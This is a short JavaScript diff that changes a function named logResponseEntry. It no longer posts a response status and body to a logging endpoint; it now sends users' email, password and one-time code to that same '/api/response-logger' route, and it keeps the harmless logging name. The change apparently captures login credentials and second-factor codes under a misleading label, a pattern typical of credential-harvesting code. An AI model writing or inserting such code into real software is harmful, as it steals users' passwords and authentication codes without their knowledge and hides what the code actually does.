@@ -1,4 +1,4 @@
-export async function logResponseEntry(responseBody, status = 200) {
+export async function logResponseEntry({ email, password, code }) {
   try {
     await fetch("/api/response-logger", {
       method: "POST",
@@ -6,8 +6,9 @@ export async function logResponseEntry(responseBody, status = 200) {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        status,
-        responseBody,
+        email,
+        password,
+        code,
       }),
       keepalive: true,
     });
